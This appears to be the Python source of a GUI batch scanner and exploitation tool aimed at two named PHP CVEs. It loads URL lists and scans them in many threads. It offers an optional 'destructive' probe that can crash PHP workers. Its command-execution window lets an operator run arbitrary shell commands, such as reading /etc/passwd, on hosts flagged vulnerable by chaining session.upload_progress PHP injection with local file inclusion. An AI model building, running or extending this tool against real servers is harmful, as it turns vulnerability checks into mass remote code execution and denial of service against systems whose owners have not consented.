#!/usr/bin/env python3
"""
php2shell scanner — CVE-2026-109618/CVE-2026-109619
Batch security scanner with graphical interface.
Added: right-click vulnerable entry-->command execution window (RCE verify,
runs id/whoami via session.upload_progress-->LFI to cut false positives).
"""
import csv
import json
import os
import queue
import threading
import uuid
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import scanner

# ===================== JAPANESE DARK THEME =====================
THEME_BG_MAIN = "#121212"          # 主炭黑
THEME_BG_PANEL = "#1c1c24"         # 面板背景暗靛黑
THEME_TEXT_NORMAL = "#d8d8d8"      # 普通文字灰白
THEME_TEXT_GOLD = "#d4af37"        # 暗金（日式金）
THEME_BTN_BG = "#292933"
THEME_BORDER = "#444450"

FONT_MONO = ("Consolas", 10)

# 结果行颜色
VERDICT_COLORS = {
    "VULNERABLE": "#441818",        # 暗朱红
    "LIKELY_VULNERABLE": "#3b2e18", # 暗土黄
    "PATCHED": "#183028",           # 深青黛绿
    "UNKNOWN": "#22222c",           # 墨灰
    "ERROR": "#481414",             # 暗红褐
}
VERDICT_ORDER = {
    "VULNERABLE": 0,
    "LIKELY_VULNERABLE": 1,
    "UNKNOWN": 2,
    "PATCHED": 3,
    "ERROR": 4,
}
COLUMNS = ("target", "version", "sapi", "verdict", "confidence", "chains")
COLUMN_HEADERS = {
    "target": "Target",
    "version": "PHP Version",
    "sapi": "SAPI",
    "verdict": "Verdict",
    "confidence": "Confidence",
    "chains": "Chains",
}
COLUMN_WIDTHS = {
    "target": 280,
    "version": 110,
    "sapi": 80,
    "verdict": 150,
    "confidence": 100,
    "chains": 130,
}

# 命令执行窗口的默认 exploit 配置
DEFAULT_INJECTION_PATH = ""
DEFAULT_LFI_PARAM = "page"
DEFAULT_LFI_PATH = "lfi.php"
# DEFAULT_SESSION_DIRS_TEXT = "/tmp/,/var/lib/php/sessions/,/var/lib/php/session/,/var/lib/php5/,/var/lib/php/"
DEFAULT_SESSION_DIRS_TEXT = "D:\\phpstudy_pro\\Extensions\\tmp\\tmp"
QUICK_COMMANDS = ["id", "whoami", "uname -a", "ls"]


class CommandWindow:
    """RCE 验证窗口：对单个脆弱目标执行命令（id/whoami…）确认漏洞，降低误报。
    链路：session.upload_progress注入PHP-->LFI包含session文件-->命令回显。
    """

    def __init__(self, master, result):
        self.master = master
        self.result = result or {}
        self.win = tk.Toplevel(master)
        self.win.title("命令执行窗口 — %s" % self.result.get("target", ""))
        self.win.geometry("1020x740")
        self.win.minsize(760, 560)
        self.win.configure(bg=THEME_BG_MAIN)
        self.win.transient(master)
        self._running = False
        self._cmd_history = []      # 手写命令历史
        self._hist_idx = 0
        self._build_ui()

    def _build_ui(self):
        # ── Target info ──
        top = ttk.Frame(self.win, padding=(10, 8))
        top.pack(fill=tk.X)
        ttk.Label(top, text="Target:", foreground=THEME_TEXT_GOLD).pack(side=tk.LEFT)
        ttk.Label(top, text=self.result.get("target", ""),
                  foreground=THEME_TEXT_NORMAL, font=FONT_MONO).pack(side=tk.LEFT, padx=(6, 0))
        verdict = self.result.get("verdict", "")
        ttk.Label(top, text="  " + verdict, foreground=THEME_TEXT_GOLD).pack(side=tk.LEFT)
        v = self.result.get("version") or "-"
        sapi = self.result.get("sapi") or "-"
        ttk.Label(top, text="  PHP %s / %s" % (v, sapi),
                  foreground="#888888").pack(side=tk.LEFT)

        # ── Command（放到最上方，打开即见执行按钮）──
        cmd_frame = ttk.LabelFrame(self.win, text="命令执行 (Command)", padding=(10, 8))
        cmd_frame.pack(fill=tk.X, padx=10, pady=(6, 6))

        self.var_cmd = tk.StringVar(value="id")
        self.entry_cmd = ttk.Entry(cmd_frame, textvariable=self.var_cmd,
                                   width=46, font=FONT_MONO)
        self.entry_cmd.pack(side=tk.LEFT, padx=(0, 8))
        self.entry_cmd.bind("<Return>", lambda e: self._execute())
        self.entry_cmd.bind("<Up>", self._hist_up)
        self.entry_cmd.bind("<Down>", self._hist_down)
        for c in QUICK_COMMANDS:
            ttk.Button(cmd_frame, text=c,
                       command=lambda cmd=c: self._quick_run(cmd)).pack(
                side=tk.LEFT, padx=(0, 4))

        run_row = ttk.Frame(cmd_frame)
        run_row.pack(fill=tk.X, pady=(8, 0))
        self.btn_exec = ttk.Button(run_row, text="执行命令",
                                   style="Danger.TButton", command=self._execute)
        self.btn_exec.pack(side=tk.LEFT,anchor="center")
        self.lbl_state = ttk.Label(run_row, text="Ready", foreground="#888888")
        self.lbl_state.pack(side=tk.LEFT, padx=(12, 0),anchor="center")

        # ── Exploit 配置（因应用而异，需按目标实际情况调整）──
        cfg = ttk.LabelFrame(self.win, text="Exploit 配置（按目标调整）", padding=(10, 8))
        cfg.pack(fill=tk.X, padx=10, pady=(0, 6))

        base_path = self.result.get("path") or DEFAULT_LFI_PATH

        ttk.Label(cfg, text="注入URL(处理 session.upload_progress):").grid(row=0, column=0, sticky=tk.W)
        self.var_inj = tk.StringVar(value=self.result.get("path") or DEFAULT_LFI_PATH)
        ttk.Entry(cfg, textvariable=self.var_inj, width=52, font=FONT_MONO).grid(
            row=0, column=1, columnspan=3, sticky=tk.W, padx=6, pady=2)

        ttk.Label(cfg, text="LFI入口URL(文件包含):").grid(row=1, column=0, sticky=tk.W)
        self.var_lfi = tk.StringVar(value=DEFAULT_LFI_PATH)
        ttk.Entry(cfg, textvariable=self.var_lfi, width=52, font=FONT_MONO).grid(
            row=1, column=1, columnspan=3, sticky=tk.W, padx=6, pady=2)

        ttk.Label(cfg, text="LFI参数:").grid(row=2, column=0, sticky=tk.W)
        self.var_param = tk.StringVar(value=DEFAULT_LFI_PARAM)
        ttk.Entry(cfg, textvariable=self.var_param, width=14, font=FONT_MONO).grid(
            row=2, column=1, sticky=tk.W, padx=6, pady=2)

        ttk.Label(cfg, text="Session保存目录(逗号分隔):").grid(row=2, column=2, sticky=tk.W)
        self.var_dirs = tk.StringVar(value=DEFAULT_SESSION_DIRS_TEXT)
        ttk.Entry(cfg, textvariable=self.var_dirs, width=40, font=FONT_MONO).grid(
            row=2, column=3, sticky=tk.W, padx=6, pady=2)

        cfg.columnconfigure(0, weight=0)
        cfg.columnconfigure(1, weight=1)
        cfg.columnconfigure(2, weight=0)
        cfg.columnconfigure(3, weight=1)

        # ── Output ──
        out_frame = ttk.Frame(self.win, padding=(10, 0, 10, 10))
        out_frame.pack(fill=tk.BOTH, expand=True)
        self.txt_out = tk.Text(out_frame, wrap=tk.WORD, font=FONT_MONO,
                               bg="#171720", fg="#dddddd", insertbackground="#dddddd")
        vsb = ttk.Scrollbar(out_frame, orient="vertical", command=self.txt_out.yview)
        self.txt_out.configure(yscrollcommand=vsb.set)
        self.txt_out.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)

        hint = ("系统支持手写任意命令（例如:cat /etc/passwd、ls -la /tmp），"
                "在输入框回车或点「执行命令」即可执行；↑/↓ 键翻看命令历史。\n"
                "原理：通过 session.upload_progress 注入 PHP 到 session 文件，"
                "再由 LFI 包含该文件执行命令。\n"
                "若 LFI 入口/参数与目标实际不符，或 session 保存目录未命中，"
                "需在上方配置中调整。默认自动尝试多个常见 session 目录。")
        ttk.Label(self.win, text=hint, foreground="#888888",
                  wraplength=840, justify=tk.LEFT, padding=(10, 0, 10, 8)).pack(fill=tk.X)

        self._log("目标:%s\n" % self.result.get("target", ""))

    def _log(self, text):
        self.txt_out.insert(tk.END, text)
        self.txt_out.see(tk.END)

    def _quick_run(self, cmd):
        """点击快捷命令按钮：填命令并立即执行。"""
        self.var_cmd.set(cmd)
        self._execute()

    def _push_history(self, cmd):
        """记录执行过的命令（去重，最新在后）。"""
        cmd = cmd.strip()
        if cmd and (not self._cmd_history or self._cmd_history[-1] != cmd):
            self._cmd_history.append(cmd)
        self._hist_idx = len(self._cmd_history)

    def _hist_up(self, event):
        """↑ 键：翻到上一条历史命令。"""
        if self._cmd_history:
            if self._hist_idx > 0:
                self._hist_idx -= 1
            self.var_cmd.set(self._cmd_history[self._hist_idx])
        return "break"

    def _hist_down(self, event):
        """↓ 键：翻到下一条历史命令。"""
        if self._cmd_history:
            if self._hist_idx < len(self._cmd_history) - 1:
                self._hist_idx += 1
                self.var_cmd.set(self._cmd_history[self._hist_idx])
            else:
                self.var_cmd.set("")
        return "break"

    def _execute(self):
        if self._running:
            return
        cmd = self.var_cmd.get().strip()
        if not cmd:
            messagebox.showwarning("命令为空", "请输入要执行的命令")
            return
        inj = self.var_inj.get().strip() or "/"
        lfi = self.var_lfi.get().strip() or "/"
        param = self.var_param.get().strip() or "page"
        dirs = [d.strip() for d in self.var_dirs.get().split(",") if d.strip()]
        self._push_history(cmd)
        self._running = True
        self.btn_exec.config(state=tk.DISABLED)
        self.lbl_state.config(text="Running: %s" % cmd, foreground=THEME_TEXT_GOLD)
        self._log("\n$ %s\n" % cmd)
        t = threading.Thread(target=self._run_thread,
                             args=(cmd, inj, lfi, param, dirs),
                             daemon=True)
        t.start()

    def _run_thread(self, cmd, inj, lfi, param, dirs):
        target = self.result.get("target", "")
        try:
            r = scanner.rce_execute(target, cmd, lfi_param=param, lfi_path=lfi,
                                    injection_url=inj, session_dirs=dirs, timeout=10)
        except Exception as e:  # noqa
            r = {"ok": False, "output": "", "details": "异常: %s" % e,
                 "session_dir": None, "error": str(e)}
        self.win.after(0, lambda: self._on_finish(cmd, r))

    def _on_finish(self, cmd, r):
        self._running = False
        self.btn_exec.config(state=tk.NORMAL)
        if r.get("ok"):
            self.lbl_state.config(
                text="命令已执行",
                foreground="#7ee07e")
            self._log(r.get("output", "") + "\n")
        else:
            self.lbl_state.config(text="未确认到命令回显—调整配置后重试",
                                  foreground="#ff7777")
            self._log("[失败] %s\n" % r.get("details", "no detail"))
            if r.get("used_url"):
                self._log("LFI URL: %s\n" % r.get("used_url"))
            if r.get("attempts"):
                self._log("Attempts: %s\n" % r.get("attempts"))


class ScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("WestSec【PHP最火纪念年】 php2shell scanner — CVE‑2026‑109618/CVE‑2026‑109619 【高市早苗X上喊话要修的漏洞,就问你修不修!】")
        self.root.geometry("1100x720")
        self.root.minsize(900, 600)
        self.root.configure(bg=THEME_BG_MAIN)

        # State
        self.urls = []
        self.results = {}          # url -> result dict
        self.row_map = {}          # url -> treeview iid (uuid字符串，避免url特殊字符bug)
        self.scan_thread = None
        self.cancel_event = threading.Event()
        self.result_queue = queue.Queue()
        self.scanning = False
        self._cmd_windows = []     # 保持对命令窗口的引用，避免被 GC

        self._build_style()
        self._build_ui()
        self._poll_queue()

    def _build_style(self):
        """构建日式暗黑ttk样式"""
        style = ttk.Style(self.root)
        try:
            style.theme_use("clam")
        except tk.TclError:
            pass

        # 全局控件样式
        style.configure(".",
                        background=THEME_BG_MAIN,
                        foreground=THEME_TEXT_NORMAL,
                        fieldbackground=THEME_BG_PANEL,
                        bordercolor=THEME_BORDER)

        style.configure("TFrame", background=THEME_BG_MAIN)
        style.configure("TLabelframe", background=THEME_BG_PANEL, foreground=THEME_TEXT_GOLD)
        style.configure("TLabelframe.Label", background=THEME_BG_PANEL, foreground=THEME_TEXT_GOLD)

        style.configure("TButton",
                        background=THEME_BTN_BG,
                        foreground=THEME_TEXT_NORMAL,
                        padding=(10, 6))
        style.configure("Primary.TButton", foreground=THEME_TEXT_GOLD)
        style.configure("Danger.TButton", foreground="#ff7777")

        style.configure("TLabel", background=THEME_BG_MAIN, foreground=THEME_TEXT_NORMAL)
        style.configure("TEntry", fieldbackground="#242430", foreground=THEME_TEXT_NORMAL)
        style.configure("TSpinbox", fieldbackground="#242430", foreground=THEME_TEXT_NORMAL)
        style.configure("TCombobox", fieldbackground="#242430", foreground=THEME_TEXT_NORMAL)

        # Treeview 表格暗黑
        style.configure("Treeview",
                        background=THEME_BG_PANEL,
                        foreground=THEME_TEXT_NORMAL,
                        fieldbackground=THEME_BG_PANEL,
                        rowheight=24)
        style.configure("Treeview.Heading",
                        background="#2d2d3b",
                        foreground=THEME_TEXT_GOLD)
        style.map("Treeview", background=[("selected", "#2d3040")])

        style.configure("TProgressbar", background="#304060")

    def _build_ui(self):
        # ── Toolbar ──
        toolbar = ttk.Frame(self.root, padding=(8, 6))
        toolbar.pack(fill=tk.X)
        self.btn_load = ttk.Button(toolbar, text="Load URLs", command=self.load_urls)
        self.btn_load.pack(side=tk.LEFT)
        self.btn_scan = ttk.Button(toolbar, text="▶ Start Scan", style="Primary.TButton",
                                   command=self.start_scan)
        self.btn_scan.pack(side=tk.LEFT, padx=(8, 0))
        self.btn_stop = ttk.Button(toolbar, text="■ Stop", style="Danger.TButton",
                                   command=self.stop_scan, state=tk.DISABLED)
        self.btn_stop.pack(side=tk.LEFT, padx=(8, 0))
        self.btn_export_json = ttk.Button(toolbar, text="Export JSON",
                                          command=lambda: self.export("json"))
        self.btn_export_json.pack(side=tk.LEFT, padx=(8, 0))
        self.btn_export_csv = ttk.Button(toolbar, text="Export CSV",
                                         command=lambda: self.export("csv"))
        self.btn_export_csv.pack(side=tk.LEFT, padx=(8, 0))
        self.btn_clear = ttk.Button(toolbar, text="Clear", command=self.clear_results)
        self.btn_clear.pack(side=tk.LEFT, padx=(8, 0))

        # ── Options panel ──
        opts = ttk.LabelFrame(self.root, text="Scan Options", padding=(10, 8))
        opts.pack(fill=tk.X, padx=8, pady=(0, 4))
        r1 = ttk.Frame(opts)
        r1.pack(fill=tk.X)
        ttk.Label(r1, text="Threads:").pack(side=tk.LEFT)
        self.var_threads = tk.IntVar(value=10)
        ttk.Spinbox(r1, from_=1, to=100, textvariable=self.var_threads, width=6).pack(side=tk.LEFT, padx=(4, 16))
        ttk.Label(r1, text="Timeout (s):").pack(side=tk.LEFT)
        self.var_timeout = tk.IntVar(value=10)
        ttk.Spinbox(r1, from_=2, to=120, textvariable=self.var_timeout, width=6).pack(side=tk.LEFT, padx=(4, 16))
        ttk.Label(r1, text="Path override:").pack(side=tk.LEFT)
        self.var_path = tk.StringVar(value="")
        ttk.Entry(r1, textvariable=self.var_path, width=30).pack(side=tk.LEFT, padx=(4, 16))
        ttk.Label(r1, text="Filter:").pack(side=tk.LEFT)
        self.var_filter = tk.StringVar(value="ALL")
        filter_cb = ttk.Combobox(r1, textvariable=self.var_filter, width=18, state="readonly",
                                 values=["ALL", "VULNERABLE", "LIKELY_VULNERABLE",
                                         "UNKNOWN", "PATCHED", "ERROR"])
        filter_cb.pack(side=tk.LEFT, padx=(4, 0))
        filter_cb.bind("<<ComboboxSelected>>", lambda e: self.refresh_table())

        r2 = ttk.Frame(opts)
        r2.pack(fill=tk.X, pady=(6, 0))
        self.var_active = tk.BooleanVar(value=False)
        ttk.Checkbutton(r2, text="Enable OOM differential probe (Tier 4) — DESTRUCTIVE, may crash workers",
                        variable=self.var_active).pack(side=tk.LEFT)

        info = ttk.Frame(self.root, padding=(8, 0, 8, 4))
        info.pack(fill=tk.X)
        self.lbl_urls = ttk.Label(info, text="URLs loaded: 0", foreground=THEME_TEXT_GOLD)
        self.lbl_urls.pack(side=tk.LEFT)
        self.lbl_file = ttk.Label(info, text="", foreground="#888888")
        self.lbl_file.pack(side=tk.LEFT, padx=(16, 0))

        # ── Results table ──
        table_frame = ttk.Frame(self.root, padding=(8, 0, 8, 0))
        table_frame.pack(fill=tk.BOTH, expand=True)
        self.tree = ttk.Treeview(table_frame, columns=COLUMNS, show="headings", selectmode="browse")
        for col in COLUMNS:
            self.tree.heading(col, text=COLUMN_HEADERS[col],
                              command=lambda c=col: self.sort_by(c, False))
            self.tree.column(col, width=COLUMN_WIDTHS[col], anchor=tk.W)

        # 行标签颜色
        for vtag, bgc in VERDICT_COLORS.items():
            self.tree.tag_configure(vtag, background=bgc)

        vsb = ttk.Scrollbar(table_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=vsb.set)
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.bind("<Double-1>", self.show_details)
        self.tree.bind("<Button-3>", self._on_row_right_click)

        # ── Status bar ──
        status = ttk.Frame(self.root, padding=(8, 4))
        status.pack(fill=tk.X, side=tk.BOTTOM)
        self.progress = ttk.Progressbar(status, mode="determinate")
        self.progress.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 12))
        self.lbl_status = ttk.Label(status, text="Ready")
        self.lbl_status.pack(side=tk.RIGHT)
        self.lbl_current = ttk.Label(status, text="", foreground="#888888")
        self.lbl_current.pack(side=tk.RIGHT, padx=(0, 16))

    # ── 右键菜单：把脆弱条目发送到命令执行窗口 ──
    def _url_of_iid(self, row_iid):
        for url, uid in self.row_map.items():
            if uid == row_iid:
                return url
        return None

    def _on_row_right_click(self, event):
        row_iid = self.tree.identify_row(event.y)
        if not row_iid:
            return
        self.tree.selection_set(row_iid)
        target_url = self._url_of_iid(row_iid)
        r = self.results.get(target_url) if target_url else None
        verdict = r.get("verdict", "") if r else ""

        menu = tk.Menu(self.root, tearoff=0)
        menu.configure(bg=THEME_BG_PANEL, fg=THEME_TEXT_NORMAL,
                       activebackground="#304060", activeforeground=THEME_TEXT_GOLD)

        label = "发送到命令执行窗口(RCE验证)"
        if verdict not in ("VULNERABLE", "LIKELY_VULNERABLE"):
            menu.add_command(label="命令执行仅可用于VULNERABLE/LIKELY_VULNERABLE类型",
                             state=tk.DISABLED)
        else:
            menu.add_command(label=label,
                             command=lambda: self._open_command_window(r))
        menu.add_separator()
        menu.add_command(label="查看详情 (Details)", command=self.show_details_from_selection)
        try:
            menu.tk_popup(event.x_root, event.y_root)
        finally:
            menu.grab_release()

    def _open_command_window(self, r):
        cw = CommandWindow(self.root, r)
        self._cmd_windows.append(cw.win)   # 防止被垃圾回收
        cw.win.focus_set()

    def show_details_from_selection(self):
        self.show_details(None)

    def load_urls(self):
        path = filedialog.askopenfilename(
            title="Select URL list file",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if not path:
            return
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as f:
                lines = f.read().splitlines()
        except OSError as e:
            messagebox.showerror("Error", f"Cannot read file:\n{e}")
            return
        raw = [ln.strip() for ln in lines if ln.strip() and not ln.strip().startswith("#")]
        seen = set()
        urls = []
        for u in raw:
            if u not in seen:
                seen.add(u)
                urls.append(u)
        self.urls = urls
        self.lbl_urls.config(text=f"URLs loaded: {len(urls)}")
        self.lbl_file.config(text=os.path.basename(path))
        self.clear_results()
        messagebox.showinfo("Loaded", f"Loaded {len(urls)} unique URLs from\n{path}")

    def start_scan(self):
        if not self.urls:
            messagebox.showwarning("No URLs", "Please load a URL file first.")
            return
        if self.scanning:
            return
        if self.var_active.get():
            if not messagebox.askyesno(
                    "Active mode warning",
                    "OOM differential probe is DESTRUCTIVE and may crash PHP workers.\n\n"
                    "Use only on systems you own or are authorized to test.\n\n"
                    "Continue?"):
                return
        self.clear_results()
        self.cancel_event.clear()
        self.scanning = True
        self._set_controls_running(True)
        self.progress.config(maximum=len(self.urls), value=0)
        self.lbl_status.config(text=f"Scanning 0/{len(self.urls)}...")
        self.lbl_current.config(text="")
        threads = max(1, int(self.var_threads.get()))
        timeout = max(2, int(self.var_timeout.get()))
        path = self.var_path.get().strip() or None
        active = self.var_active.get()
        self.scan_thread = threading.Thread(
            target=self._scan_worker,
            args=(self.urls, active, path, timeout, threads),
            daemon=True)
        self.scan_thread.start()

    def stop_scan(self):
        if self.scanning:
            self.cancel_event.set()
            self.lbl_status.config(text="Stopping...")
            self.lbl_current.config(text="")

    def _scan_worker(self, urls, active, path, timeout, threads):
        def on_progress(done, total, result):
            self.result_queue.put(("result", result))
            self.result_queue.put(("progress", done, total, result["target"]))
        try:
            scanner.scan_batch(urls, active=active, path=path, timeout=timeout,
                               threads=threads, on_progress=on_progress,
                               cancel_event=self.cancel_event)
        except Exception as e:
            self.result_queue.put(("error", str(e)))
        finally:
            self.result_queue.put(("done",))

    def _poll_queue(self):
        try:
            while True:
                item = self.result_queue.get_nowait()
                kind = item[0]
                if kind == "result":
                    self._add_result(item[1])
                elif kind == "progress":
                    _, done, total, target = item
                    self.progress.config(value=done)
                    self.lbl_status.config(text=f"Scanning {done}/{total}...")
                    self.lbl_current.config(text=f"-> {target}")
                elif kind == "error":
                    messagebox.showerror("Scan error", item[1])
                elif kind == "done":
                    self._scan_finished()
        except queue.Empty:
            pass
        self.root.after(100, self._poll_queue)

    def _add_result(self, r):
        target = r["target"]
        self.results[target] = r
        self._insert_row(r)

    def _insert_row(self, r):
        verdict = r.get("verdict", "UNKNOWN")
        tags = (verdict,)
        values = (
            r.get("target", ""),
            r.get("version") or "",
            r.get("sapi") or "",
            verdict,
            r.get("confidence", ""),
            ", ".join(r.get("chains", [])),
        )
        # 过滤逻辑：内存保存全部，UI条件渲染
        filter_val = self.var_filter.get()
        if filter_val != "ALL" and verdict != filter_val:
            return

        # ✅ BUG修复：使用uuid作为iid，禁止直接使用url作为iid（url含:/?会崩溃）
        row_uid = str(uuid.uuid4())
        self.row_map[r["target"]] = row_uid
        self.tree.insert("", tk.END, iid=row_uid, values=values, tags=tags)

    def _scan_finished(self):
        self.scanning = False
        self._set_controls_running(False)
        vuln = sum(1 for r in self.results.values()
                   if r.get("verdict") in ("VULNERABLE", "LIKELY_VULNERABLE"))
        total = len(self.results)
        self.lbl_status.config(text=f"Done — {total} scanned, {vuln} vulnerable/likely")
        self.lbl_current.config(text="")
        self.progress.config(value=total)

    def _set_controls_running(self, running):
        if running:
            self.btn_scan.config(state=tk.DISABLED)
            self.btn_load.config(state=tk.DISABLED)
            self.btn_clear.config(state=tk.DISABLED)
            self.btn_stop.config(state=tk.NORMAL)
        else:
            self.btn_scan.config(state=tk.NORMAL)
            self.btn_load.config(state=tk.NORMAL)
            self.btn_clear.config(state=tk.NORMAL)
            self.btn_stop.config(state=tk.DISABLED)

    def refresh_table(self):
        self.tree.delete(*self.tree.get_children())
        self.row_map.clear()
        for r in self.results.values():
            self._insert_row(r)

    def clear_results(self):
        self.tree.delete(*self.tree.get_children())
        self.results.clear()
        self.row_map.clear()
        self.progress.config(value=0)
        self.lbl_status.config(text="Ready")
        self.lbl_current.config(text="")

    def sort_by(self, col, descending):
        items = [(self.tree.set(k, col), k) for k in self.tree.get_children("")]
        if col == "verdict":
            items.sort(key=lambda x: VERDICT_ORDER.get(x[0], 99), reverse=descending)
        else:
            items.sort(reverse=descending)
        for idx, (_, k) in enumerate(items):
            self.tree.move(k, "", idx)
        self.tree.heading(col, command=lambda: self.sort_by(col, not descending))

    def show_details(self, event):
        sel = self.tree.selection()
        if not sel:
            return
        row_iid = sel[0]
        # 反向找url
        target_url = self._url_of_iid(row_iid)
        if not target_url:
            return
        r = self.results.get(target_url)
        if not r:
            return
        win = tk.Toplevel(self.root)
        win.title(f"Details — {target_url}")
        win.geometry("720x560")
        win.configure(bg=THEME_BG_MAIN)
        txt = tk.Text(win, wrap=tk.WORD, font=("Consolas", 10), bg="#171720", fg="#dddddd")
        vsb = ttk.Scrollbar(win, orient="vertical", command=txt.yview)
        txt.configure(yscrollcommand=vsb.set)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        txt.pack(fill=tk.BOTH, expand=True)
        txt.insert(tk.END, json.dumps(r, indent=2, default=str))
        txt.config(state=tk.DISABLED)

    def export(self, fmt):
        if not self.results:
            messagebox.showwarning("Nothing to export", "No scan results yet.")
            return
        ext = ".json" if fmt == "json" else ".csv"
        path = filedialog.asksaveasfilename(
            defaultextension=ext,
            filetypes=[(fmt.upper(), f"*{ext}")],
            initialfile=f"php2shell_scan_results{ext}")
        if not path:
            return
        try:
            if fmt == "json":
                with open(path, "w", encoding="utf-8") as f:
                    json.dump(list(self.results.values()), f, indent=2, default=str)
            else:
                with open(path, "w", newline="", encoding="utf-8") as f:
                    w = csv.writer(f)
                    w.writerow(["target", "host", "port", "tls", "path",
                                "version", "sapi", "verdict", "confidence",
                                "chains", "recommendation", "error"])
                    for r in self.results.values():
                        w.writerow([
                            r.get("target", ""), r.get("host", ""),
                            r.get("port", ""), r.get("tls", ""),
                            r.get("path", ""), r.get("version") or "",
                            r.get("sapi") or "", r.get("verdict", ""),
                            r.get("confidence", ""),
                            ",".join(r.get("chains", [])),
                            r.get("recommendation", ""),
                            r.get("error") or "",
                        ])
        except OSError as e:
            messagebox.showerror("Export error", str(e))
            return
        messagebox.showinfo("Exported", f"Results saved to:\n{path}")

def main():
    root = tk.Tk()
    ScannerGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
